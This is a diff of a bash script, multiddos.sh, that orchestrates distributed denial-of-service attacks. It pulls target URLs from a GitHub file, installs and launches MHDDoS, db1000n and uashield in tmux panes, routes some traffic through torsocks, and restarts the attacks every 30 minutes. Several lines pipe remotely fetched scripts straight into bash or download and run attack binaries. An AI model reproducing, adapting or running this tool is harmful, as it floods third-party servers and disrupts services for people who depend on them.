@@ -1,8 +1,7 @@
 #!/bin/bash
 # curl -L tiny.one/multiddos | bash && tmux a
 
-clear
-echo -e "Loading...\n"
+clear && echo -e "Loading...\n"
 
 sudo apt-get update -q -y #>/dev/null 2>&1
 # sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
@@ -33,42 +32,35 @@ export methods="--http-methods GET STRESS"
 #rpc="--rpc 2000"
 #export debug="--debug"
 
-
 ### prepare target files (main and secondary)
 prepare_targets_and_banner () {
-export all_targets="/var/tmp/all.uaripper.targets"
-export main_targets="/var/tmp/main.uaripper.targets"
-export main_targets_tmp="/var/tmp/main_tmp.uaripper.targets"
-export sec_targets="/var/tmp/secondary.uaripper.targets"
-export sec_targets_tmp="/var/tmp/secondary_tmp.uaripper.targets"
+export all_targets="/var/tmp/all.uaripper"
+export main_targets="/var/tmp/main.uaripper"
+export main_targets_tmp="/var/tmp/main_tmp.uaripper"
+export sec_targets="/var/tmp/secondary.uaripper"
+export sec_targets_tmp="/var/tmp/secondary_tmp.uaripper"
+rm -f /var/tmp/*uaripper #remove previous copies
 
-#remove previous copies
-rm -f /var/tmp/*uaripper.targets
-
-# read targets from github and put only uncommented lines in file $all_targets
+# read targets from github and put them in file $all_targets. Commented and empty lines excluded.
 echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets_parts)" | while read LINE; do
-    if [[ $LINE != "#"* ]]; then
+    if [[ "$LINE" != "#"* ]] && [ "$LINE" != "" ] ; then
         echo $LINE >> $all_targets
     fi
 done
 
-#delete empty lines from file
-sed -i '/^$/d' $all_targets
-
 # put every line except last line in file $sec_targets
 head -n -1 $all_targets > $sec_targets
-
 # put only last line in file $main_targets
 tail -n 1 $all_targets > $main_targets
 
-# put all addresses found in $sec_targets in a file on a new line
+# put all addresses in $sec_targets on a new line
 for i in $(cat $sec_targets); do
     if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
         echo $i >> $sec_targets_tmp
     fi
 done
 
-# put all addresses found in $main_targets in a file on a new line
+# put all addresses in $main_targets on a new line
 for i in $(cat $main_targets); do
     if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
         echo $i >> $main_targets_tmp
@@ -92,7 +84,6 @@ echo -e "\n" && sleep 0.1
 echo -e "Secondary targets:" "\x1b[32m $(cat $sec_targets | sort | uniq | wc -l)\x1b[m" && sleep 0.1
 echo -e "Main targets:     " "\x1b[32m $(cat $main_targets | sort | uniq | wc -l)\x1b[m" && sleep 0.1
 echo -e "Total:            " "\x1b[32m $(expr $(cat $sec_targets | sort | uniq | wc -l) + $(cat $main_targets | sort | uniq | wc -l))\x1b[m" && sleep 0.1
-
 echo -e "\nКількість потоків:" "\x1b[32m $(echo $threads | cut -d " " -f2)\x1b[m" && sleep 0.1
 echo -e "\nЗавантаження..."
 sleep 5
@@ -100,12 +91,9 @@ sleep 5
 export -f prepare_targets_and_banner
 
 launch () {
-if [ ! -f "/usr/local/bin/gotop" ]; then
-    curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
-    sudo dpkg -i gotop.deb
-fi
 
-# kill previous sessions or processes in case they wasn't 
+
+# kill previous sessions or processes in case they still in memory
 tmux kill-session -t multiddos > /dev/null 2>&1
 sudo pkill node > /dev/null 2>&1
 sudo pkill shield > /dev/null 2>&1
@@ -113,9 +101,12 @@ sudo pkill shield > /dev/null 2>&1
 grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
 tmux source-file ~/.tmux.conf > /dev/null 2>&1
 
-
 if [[ $gotop == "on" ]]; then
-    tmux new-session -s multiddos -d 'gotop -asc solarized'
+    if [ ! -f "/usr/local/bin/gotop" ]; then
+        curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
+        sudo dpkg -i gotop.deb
+    fi
+    tmux new-session -s multiddos -d 'gotop -sc solarized'
     sleep 0.2
     tmux split-window -h -p 66 'bash auto_bash.sh'
 else 
@@ -131,20 +122,21 @@ fi
 
 if [[ $vnstat == "on" ]]; then
 sudo apt install vnstat
-sleep 0.2
+#sleep 0.2
 tmux split-window -v 'vnstat -l'
 fi
 
 if [[ $db1000n == "on" ]]; then
 sudo apt -yq install torsocks
-sleep 0.2
+#sleep 0.2
 tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
-#tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 fi
+
 if [[ $uashield == "on" ]]; then
 sleep 0.2
 tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
 fi
+
 if [[ $matrix == "on" ]] && [[ $gotop == "on" ]]; then
 sleep 0.2
 tmux select-pane -t 0
@@ -156,14 +148,14 @@ fi
 
 usage () {
 cat << EOF
-usage: bash multiddos.sh [-d|-u|-t|-m|-h]
-                            -d | --db1000n        - disable db1000n
-                            -g | --gotop          - disable gotop
-                            +u | --uashield       - enable uashield
-                            -t | --threads        - threads; default = 1000
-                            +m | --matrix         - enable matrix
-                            +v | --vnstat         - enable vnstat -l (traffic monitoring)
-                            -h | --help           - brings up this menu
+usage: bash multiddos.sh [+d|+u|-t|+m|-h]
+                          -g | --gotop        - disable gotop
+                          +d | --db1000n      - enable db1000n
+                          +u | --uashield     - enable uashield
+                          +m | --matrix       - enable matrix
+                          +v | --vnstat       - enable vnstat -l (traffic monitoring)
+                          -t | --threads      - threads
+                          -h | --help         - brings up this menu
 EOF
 exit
 }
@@ -215,8 +207,7 @@ git clone https://github.com/MHProDev/MHDDoS.git
 
 # Restart attacks and update targets every 30 minutes
 while true; do
-echo "threads: "$threads
-echo "methods: "$methods
+echo "threads: "$threads; echo "methods: "$methods
 sleep 2
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $main_targets $threads $methods&
